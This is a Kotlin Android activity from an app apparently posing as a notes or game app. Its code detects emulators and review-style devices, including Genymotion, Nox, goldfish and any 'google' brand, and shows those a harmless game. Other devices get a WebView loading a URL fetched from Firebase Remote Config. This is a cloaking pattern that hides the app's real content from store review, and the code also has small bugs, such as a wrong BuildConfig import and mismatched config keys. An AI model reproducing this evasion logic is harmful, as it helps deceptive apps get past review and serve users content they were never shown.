package ceton.roun.notes.webview

import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Parcelable
import android.provider.MediaStore
import android.provider.Settings
import android.util.Log
import android.webkit.ValueCallback
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import ceton.roun.notes.R
import ceton.roun.notes.databinding.ActivityMainBinding
import ceton.roun.notes.game.GameActivity
import com.google.firebase.BuildConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import java.io.File
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.*

class MainActivity : AppCompatActivity(R.layout.activity_main) {
    private var mUploadMessage: ValueCallback<Uri?>? = null
    private var mCapturedImageURI: Uri? = null
    private var mFilePathCallback: ValueCallback<Array<Uri>>? = null
    private var mCameraPhotoPath: String? = null

    lateinit var binding: ActivityMainBinding

    companion object {
        const val SP_LINK = "SP_LINK"
        const val SP_LINK_VALUE = "SP_LINK_VALUE"

        private const val INPUT_FILE_REQUEST_CODE = 1
        private const val FILECHOOSER_RESULTCODE = 1
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        supportActionBar?.hide()

        if (checkIsEmu()) {
            startGame()
        } else {
            val savedUrl =
                getSharedPreferences("myPreferences", Context.MODE_PRIVATE).getString("myKey", "")
            if (savedInstanceState == null) {
                if (!savedUrl.isNullOrEmpty()) {
                    val webViewFragment = WebViewFragment.newInstance()
                    supportFragmentManager
                        .beginTransaction()
                        .replace(R.id.fragment_container, webViewFragment)
                        .commit()
                } else {
                    try {
                        val remoteConfig = FirebaseRemoteConfig.getInstance()
                        val defaults = mapOf(
                            "webview_url" to ""
                        )
                        remoteConfig.setDefaultsAsync(defaults)
                        remoteConfig.fetchAndActivate().addOnCompleteListener { task ->
                            if (task.isSuccessful) {
                                val url = remoteConfig.getString("url")

                                if (url.isEmpty()) {
                                    startGame()
                                } else {
                                    val sharedPreferences =
                                        getSharedPreferences("myPreferences", Context.MODE_PRIVATE)
                                    val editor = sharedPreferences.edit()
                                    editor.putString("myKey", url)
                                    editor.apply()

                                    val webViewFragment = WebViewFragment.newInstance()
                                    supportFragmentManager
                                        .beginTransaction()
                                        .replace(R.id.fragment_container, webViewFragment)
                                        .commit()
                                }
                            } else {
                                startGame()
                            }
                        }
                    } catch (e: Exception) {
                        startGame()
                    }
                }
            }
        }
    }

    private fun isInternetAvailable(): Boolean {
        val connectivityManager =
            getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = connectivityManager.activeNetwork
            val networkCapabilities = connectivityManager.getNetworkCapabilities(network)
            networkCapabilities != null &&
                    (networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
                            || networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR))
        } else {
            val networkInfo = connectivityManager.activeNetworkInfo
            networkInfo != null && networkInfo.isConnected
        }
    }

    private fun showAlertDialog(context: Context, title: String, message: String) {
        val alertDialogBuilder = AlertDialog.Builder(context)

        alertDialogBuilder.setTitle(title)
        alertDialogBuilder.setMessage(message)

        alertDialogBuilder.setPositiveButton(
            "OK"
        ) { dialog, _ ->
            val intent = Intent(Settings.ACTION_SETTINGS)
            context.startActivity(intent)
            dialog.dismiss()
        }
        alertDialogBuilder.setNegativeButton(
            "Cancel"
        ) { dialog, _ -> dialog.dismiss() }

        val alertDialog = alertDialogBuilder.create()
        alertDialog.show()
    }

    private fun startGame() {
        val intent = Intent(this, GameActivity::class.java)
        startActivity(intent)
        finish()
    }

    private fun checkIsEmu(): Boolean {
        if (BuildConfig.DEBUG) return false
        val phoneModel = Build.MODEL
        val buildProduct = Build.PRODUCT
        val buildHardware = Build.HARDWARE
        val brand: String = Build.BRAND;
        var result = (Build.FINGERPRINT.startsWith("generic")
                || phoneModel.contains("google_sdk")
                || phoneModel.lowercase(Locale.getDefault()).contains("droid4x")
                || phoneModel.contains("Emulator")
                || phoneModel.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || buildHardware == "goldfish"
                || Build.BRAND.contains("google")
                || buildHardware == "vbox86"
                || buildProduct == "sdk"
                || buildProduct == "google_sdk"
                || buildProduct == "sdk_x86"
                || buildProduct == "vbox86p"
                || Build.BOARD.lowercase(Locale.getDefault()).contains("nox")
                || Build.BOOTLOADER.lowercase(Locale.getDefault()).contains("nox")
                || buildHardware.lowercase(Locale.getDefault()).contains("nox")
                || buildProduct.lowercase(Locale.getDefault()).contains("nox"))
        if (result) return true
        result = result or (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
        if (result) return true
        result = result or ("google_sdk" == buildProduct)
        return result
    }

    private fun getLinkFromSharedPreferences(): String {
        val sp = getSharedPreferences(SP_LINK, Context.MODE_PRIVATE)
        return sp.getString(SP_LINK_VALUE, "")!!
    }

    fun isLinkSaved() = getLinkFromSharedPreferences() != ""

    @Throws(IOException::class)
    private fun createImageFile(): File {
        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss").format(Date())
        val imageFileName = "JPEG_" + timeStamp + "_"
        val storageDir = Environment.getExternalStoragePublicDirectory(
            Environment.DIRECTORY_PICTURES
        )
        return File.createTempFile(
            imageFileName,  /* prefix */
            ".jpg",  /* suffix */
            storageDir /* directory */
        )
    }

    inner class ChromeClient : WebChromeClient() {
        override fun onShowFileChooser(
            view: WebView, filePath: ValueCallback<Array<Uri>>, fileChooserParams: FileChooserParams
        ): Boolean {
            if (mFilePathCallback != null) {
                mFilePathCallback!!.onReceiveValue(null)
            }
            mFilePathCallback = filePath
            var takePictureIntent: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
            if (takePictureIntent!!.resolveActivity(packageManager) != null) {
                var photoFile: File? = null
                try {
                    photoFile = createImageFile()
                    takePictureIntent.putExtra("PhotoPath", mCameraPhotoPath)
                } catch (ex: IOException) {
                    Log.e("ErrorCreatingFile", "Unable to create Image File", ex)
                }

                if (photoFile != null) {
                    mCameraPhotoPath = "file:" + photoFile.absolutePath
                    takePictureIntent.putExtra(
                        MediaStore.EXTRA_OUTPUT, Uri.fromFile(photoFile)
                    )
                } else {
                    takePictureIntent = null
                }
            }
            val contentSelectionIntent = Intent(Intent.ACTION_GET_CONTENT)
            contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE)
            contentSelectionIntent.type = "image/*"
            val intentArray: Array<Intent?> =
                takePictureIntent?.let { arrayOf(it) } ?: arrayOfNulls(0)
            val chooserIntent = Intent(Intent.ACTION_CHOOSER)
            chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent)
            chooserIntent.putExtra(Intent.EXTRA_TITLE, "Image Chooser")
            chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray)
            startActivityForResult(chooserIntent, INPUT_FILE_REQUEST_CODE)
            return true
        }

        fun openFileChooser(uploadMsg: ValueCallback<Uri?>?, acceptType: String? = "") {
            mUploadMessage = uploadMsg
            val imageStorageDir = File(
                Environment.getExternalStoragePublicDirectory(
                    Environment.DIRECTORY_PICTURES
                ), "AndroidExampleFolder"
            )
            if (!imageStorageDir.exists()) {
                imageStorageDir.mkdirs()
            }

            val file = File(
                imageStorageDir.toString() + File.separator + "IMG_" + System.currentTimeMillis()
                    .toString() + ".jpg"
            )
            mCapturedImageURI = Uri.fromFile(file)

            val captureIntent = Intent(
                MediaStore.ACTION_IMAGE_CAPTURE
            )
            captureIntent.putExtra(MediaStore.EXTRA_OUTPUT, mCapturedImageURI)
            val i = Intent(Intent.ACTION_GET_CONTENT)
            i.addCategory(Intent.CATEGORY_OPENABLE)
            i.type = "image/*"

            val chooserIntent = Intent.createChooser(i, "Image Chooser")

            chooserIntent.putExtra(
                Intent.EXTRA_INITIAL_INTENTS, arrayOf<Parcelable>(captureIntent)
            )

            startActivityForResult(chooserIntent, FILECHOOSER_RESULTCODE)
        }

        fun openFileChooser(
            uploadMsg: ValueCallback<Uri?>?, acceptType: String?, capture: String?
        ) {
            openFileChooser(uploadMsg, acceptType)
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (requestCode != INPUT_FILE_REQUEST_CODE || mFilePathCallback == null) {
                super.onActivityResult(requestCode, resultCode, data)
                return
            }
            var results: Array<Uri>? = null

            if (resultCode == AppCompatActivity.RESULT_OK) {
                if (data == null) {
                    if (mCameraPhotoPath != null) {
                        results = arrayOf(Uri.parse(mCameraPhotoPath))
                    }
                } else {
                    val dataString = data.dataString
                    if (dataString != null) {
                        results = arrayOf(Uri.parse(dataString))
                    }
                }
            }
            mFilePathCallback!!.onReceiveValue(results)
            mFilePathCallback = null
        } else if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.KITKAT) {
            if (requestCode != FILECHOOSER_RESULTCODE || mUploadMessage == null) {
                super.onActivityResult(requestCode, resultCode, data)
                return
            }
            if (requestCode == FILECHOOSER_RESULTCODE) {
                if (null == mUploadMessage) {
                    return
                }
                var result: Uri? = null
                try {
                    result = if (resultCode != AppCompatActivity.RESULT_OK) {
                        null
                    } else {

                        if (data == null) mCapturedImageURI else data.data
                    }
                } catch (e: Exception) {
                    Toast.makeText(
                        applicationContext, "activity :$e", Toast.LENGTH_LONG
                    ).show()
                }
                mUploadMessage!!.onReceiveValue(result)
                mUploadMessage = null
            }
        }
        return
    }
}